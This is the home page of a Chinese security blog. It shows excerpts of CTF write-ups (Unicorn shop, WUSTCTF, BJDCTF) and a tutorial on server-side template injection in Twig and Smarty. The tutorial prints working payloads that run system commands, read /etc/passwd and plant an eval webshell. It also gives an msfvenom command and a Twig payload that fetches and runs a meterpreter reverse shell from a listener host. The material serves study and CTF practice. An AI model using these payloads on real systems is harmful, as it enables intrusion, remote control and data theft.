
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8" />
    <title>why</title>
    <meta name="author" content="why" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <link rel="icon" href="/images/avatar.jpg" />
    <link rel="preconnect" href="https://s4.zstatic.net" />
<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
<link rel="preconnect" href="https://fonts.loli.net" />
<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>


<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
<link
    rel="stylesheet"
    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
/>
<script src="/js/lib/highlight.js"></script>



<script src="/js/lib/preview.js"></script>





<script src="/js/lib/home.js"></script>

<link rel="stylesheet" href="/css/main.css" />

<meta name="generator" content="Hexo 7.1.1"></head>
<body>
    <div id="layout">
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>加载过慢请开启缓存 浏览器默认开启</p>
                    <img src="/images/loading.gif" />
                </div>
            </div>
        </transition>
        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
    <nav id="desktop-menu">
        <a class="title" href="/">
            <span>WHY</span>
        </a>
        
        <a href="/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </nav>
    <nav id="mobile-menu">
        <div class="title" @click="showMenuItems = !showMenuItems">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;WHY</span>
        </div>
        <transition name="slide">
            <div class="items" v-show="showMenuItems">
                
                <a href="/">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-house fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                    </div>
                </a>
                
                <a href="/about">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-id-card fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                    </div>
                </a>
                
                <a href="/archives">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-box-archive fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                    </div>
                </a>
                
                <a href="/categories">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-bookmark fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                    </div>
                </a>
                
                <a href="/tags">
                    <div class="item">
                        <div style="min-width: 20px; max-width: 50px; width: 10%">
                            <i class="fa-solid fa-tags fa-fw"></i>
                        </div>
                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                    </div>
                </a>
                
            </div>
        </transition>
    </nav>
</div>
<transition name="fade">
    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
</transition>

        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
            <div id="home-head">
    <div id="home-background" ref="homeBackground" data-images="/images/background.jpg"></div>
    <div id="home-info" @click="homeClick">
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="loop"></span>
        <span class="info">
            <div class="wrap">
                <h1>why</h1>
                <h3>疯疯癫癫的小辣鸡</h3>
                <h5></h5>
            </div>
        </span>
    </div>
</div>
<div id="home-posts-wrap" true ref="homePostsWrap">
    <div id="home-posts">
        

<div class="post">
    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/ASIS-2019-Unicorn-shop/">
        <h2 class="post-title">[ASIS 2019]Unicorn shop</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/14
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/ASIS-2019-Unicorn-shop/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514211603682.png" alt="image-20240514211603682"></p>
<p>怎么说这道题呢？</p>
<p>我只能说，不是哥们</p>
<p>我真的是醉了</p>
<p>买 1 输入9也不行，我在想是不是有问题</p>
<p>我觉得就是9输进去之后就不是9了，所以不对</p>
<p>所以到处看看</p>
<p>看到unicorn</p>
<p>emm</p>
<p>应该是提示的unicode吧，我实在找不到线索了</p>
<p>所以呢，也就是说，emm，这个去找一个code解码之后很大的字符试试</p>
<p>找了个10000</p>
<h1 id="፼"><a href="#፼" class="headerlink" title="፼"></a>፼</h1><p>好好好</p>
<p>拿到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/ASIS-2019-Unicorn-shop/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/">
        <h2 class="post-title">[WUSTCTF2020]朴实无华</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/14
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>先扫描文件，发现robots.txt</p>
<p>之后发现</p>
<p><img src="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164746970.png" alt="image-20240514164746970"></p>
<p>抓包访问</p>
<p>发现</p>
<p><img src="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164317787.png" alt="image-20240514164317787"></p>
<p>前往发现代码</p>
<p><img src="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514164708798.png" alt="image-20240514164708798"></p>
<p>level1：</p>
<p>num&lt;2020 num+1&gt;2021</p>
<p>怎么说，因为intval，所以15e10&#x3D;15</p>
<p>但是15e10+1就是15e10+1代表的值</p>
<p>所以传这个就行</p>
<p>level2：</p>
<p>$md5&#x3D;&#x3D;md5($md5)</p>
<p>但是是弱比较，所以就是说0exxxxxx&#x3D;0exxxxxxxx</p>
<p>找到一个0e开头且md5值0e开头的就行</p>
<p>level3：</p>
<p>system(get_flag)</p>
<p>先传个ls上去，这里是过滤了cat和空格</p>
<p>找到</p>
<p><img src="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514165826395.png" alt="image-20240514165826395"></p>
<p>所以就是绕过空格和cat</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>

<p>拿到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Mark-loves-cat/">
        <h2 class="post-title">[BJDCTF2020]Mark loves cat</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/14
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p><img src="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Mark-loves-cat/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153039668.png" alt="image-20240514153039668"></p>
<p>emm就是，怎么说，查看源代码没什么用</p>
<p>所以扫文件发现后台的git文件</p>
<p>再进行githack，下载下载下来了文件</p>
<p><img src="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Mark-loves-cat/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153143827.png" alt="image-20240514153143827"></p>
<p><img src="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Mark-loves-cat/Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514153255877.png" alt="image-20240514153255877"></p>
<p>发现了这个！！！</p>
<p>所以我们要想办法，把$handsome之类的改为flag</p>
<p>最简单的就是在get里面yds&#x3D;flag</p>
<p>拿到flag</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2024/05/14/buu%E5%88%B7%E9%A2%98%E9%9B%86/BJDCTF2020-Mark-loves-cat/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/13/ssti/ssti/">
        <h2 class="post-title">ssti</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/13
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>php常见的模板：twig，smarty，blade</p>
<p>  <em>1Twig</em></p>
<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815153729779-1563757467.png" alt="img"></a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#x27;\twig\lib\Twig\Autoloader.php&#x27;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">　　$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值</span><br><span class="line">　　echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p>
<p>其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。</p>
<p>使用 Twig 模版引擎渲染页面，其中模版含有  变量，其模版变量值来自于GET请求参数$_GET[“name”] 。</p>
<p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815170919414-672456065.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815170919414-672456065.png" alt="img"></a></p>
<p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">　　require_once dirname(__FILE__).&#x27;/../lib/Twig/Autoloader.php&#x27;;</span><br><span class="line">　　Twig_Autoloader::register(true);</span><br><span class="line">　　$twig=newTwig_Environment(newTwig_Loader_String());</span><br><span class="line">　　$output=$twig-&gt;render(&quot;Hello &#123;$_GET[&#x27;name&#x27;]&#125;&quot;);// 将用户输入作为模版内容的一部分</span><br><span class="line">　　echo $output;?&gt;</span><br></pre></td></tr></table></figure>

<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171105220-873778530.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171105220-873778530.png" alt="img"></a></p>
<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。</p>
<p>在Twig模板引擎里,， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。</p>
<p>例如这里用户输入name&#x3D;20 ，则在服务端拼接的模版内容为:</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171519739-387170199.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200815171519739-387170199.png" alt="img"></a></p>
<p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>实际服务端要进行编译的模板就被构造为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bmjoker&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</span><br></pre></td></tr></table></figure>

<p>由于  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 16 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK </p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195732706-567305144.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195732706-567305144.png" alt="img"></a></p>
<p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195801226-981945295.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818195801226-981945295.png" alt="img"></a></p>
<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
<p>每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>
<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
<p>凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</p>
<p>接下来借助XVWA的代码来实践演示一下SSTI注入</p>
<p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;p&gt;Welcome, &#123;&#123;username&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;div&gt;&#123;%$a%&#125;&lt;/div&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231335548-122594708.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231335548-122594708.png" alt="img"></a></p>
<blockquote>
<p>根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 双括号 的处理方式</p>
<p>在这里提供一个针对twig的攻击载荷：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231853350-914354726.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818231853350-914354726.png" alt="img"></a></p>
<p>使用msf生成了一个php meterpreter有效载荷</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt</span><br></pre></td></tr></table></figure>

<p>msf进行监听：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232520602-1757346385.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232520602-1757346385.png" alt="img"></a></p>
<p>模板注入远程下载shell，并重命名运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232914668-1182705687.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200818232914668-1182705687.png" alt="img"></a></p>
<p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>具体payload分析详见：《<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-5">TWIG 全版本通用 SSTI payloads</a>》</p>
<p>　　　　　　　　　　 《<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4588149/blog/4408349">SSTI-服务器端模板注入</a>》</p>
<p>*<strong>2*</strong>|***2***<strong>Smarty</strong></p>
<p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p>
<p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200910234359019-777787778.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200910234359019-777787778.png" alt="img"></a></p>
<p>因此我们可以用这个方法读文件，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>同样</p>
<p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Smarty_Internal_Write_File</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * Writes file in a safe way to disk</span><br><span class="line">     *</span><br><span class="line">     * @param  string $_filepath complete filepath</span><br><span class="line">     * @param  string $_contents file content</span><br><span class="line">     * @param  Smarty $smarty    smarty instance</span><br><span class="line">     *</span><br><span class="line">     * @throws SmartyException</span><br><span class="line">     * @return boolean true</span><br><span class="line">     */</span><br><span class="line">    public function writeFile($_filepath, $_contents, Smarty $smarty)</span><br><span class="line">    &#123;</span><br><span class="line">        $_error_reporting = error_reporting();</span><br><span class="line">        error_reporting($_error_reporting &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        if ($smarty-&gt;_file_perms !== null) &#123;</span><br><span class="line">            $old_umask = umask(0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_dirpath = dirname($_filepath);</span><br><span class="line">        // if subdirs, create dir structure</span><br><span class="line">        if ($_dirpath !== &#x27;.&#x27; &amp;&amp; !file_exists($_dirpath)) &#123;</span><br><span class="line">            mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // write to tmp file, then move to overt file lock race condition</span><br><span class="line">        $_tmp_file = $_dirpath . DS . str_replace(array(&#x27;.&#x27;, &#x27;,&#x27;), &#x27;_&#x27;, uniqid(&#x27;wrt&#x27;, true));</span><br><span class="line">        if (!file_put_contents($_tmp_file, $_contents)) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_tmp_file&#125;&quot;);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">         * Windows&#x27; rename() fails if the destination exists,</span><br><span class="line">         * Linux&#x27; rename() properly handles the overwrite.</span><br><span class="line">         * Simply unlink()ing a file might cause other processes</span><br><span class="line">         * currently reading that file to fail, but linux&#x27; rename()</span><br><span class="line">         * seems to be smart enough to handle that for us.</span><br><span class="line">         */</span><br><span class="line">        if (Smarty::$_IS_WINDOWS) &#123;</span><br><span class="line">            // remove original file</span><br><span class="line">            if (is_file($_filepath)) &#123;</span><br><span class="line">                @unlink($_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">            // rename tmp file</span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // rename tmp file</span><br><span class="line">            $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            if (!$success) &#123;</span><br><span class="line">                // remove original file</span><br><span class="line">                if (is_file($_filepath)) &#123;</span><br><span class="line">                    @unlink($_filepath);</span><br><span class="line">                &#125;</span><br><span class="line">                // rename tmp file</span><br><span class="line">                $success = @rename($_tmp_file, $_filepath);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$success) &#123;</span><br><span class="line">            error_reporting($_error_reporting);</span><br><span class="line">            throw new SmartyException(&quot;unable to write file &#123;$_filepath&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($smarty-&gt;_file_perms !== null) &#123;</span><br><span class="line">            // set file permissions</span><br><span class="line">            chmod($_filepath, $smarty-&gt;_file_perms);</span><br><span class="line">            umask($old_umask);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting($_error_reporting);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function clearConfig($varname = null)</span><br><span class="line">&#123;</span><br><span class="line">    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们可以构造payload写个webshell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>

<p><strong>CTF实例讲解</strong></p>
<p>CTF地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
<p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820231808793-180982707.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820231808793-180982707.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232249193-1694257286.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232249193-1694257286.png" alt="img"></a></p>
<p>在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。</p>
<p>将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232629595-1646272720.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232629595-1646272720.png" alt="img"></a></p>
<p>直接构造 {system(‘cat &#x2F;flag’)} 即可得到flag</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232839480-729397105.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820232839480-729397105.png" alt="img"></a></p>
<p><strong>Smarty-SSTI常规利用方式：</strong></p>
<p><strong>1. {$smarty.version}</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;  #获取smarty的版本号</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233050238-1942906786.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233050238-1942906786.png" alt="img"></a></p>
<p><strong>2. {php}{&#x2F;php}</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;  #执行相应的php代码</span><br></pre></td></tr></table></figure>

<p>Smarty支持使用 {php}{&#x2F;php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{&#x2F;php}标签会报错：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233259128-196602210.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233259128-196602210.png" alt="img"></a></p>
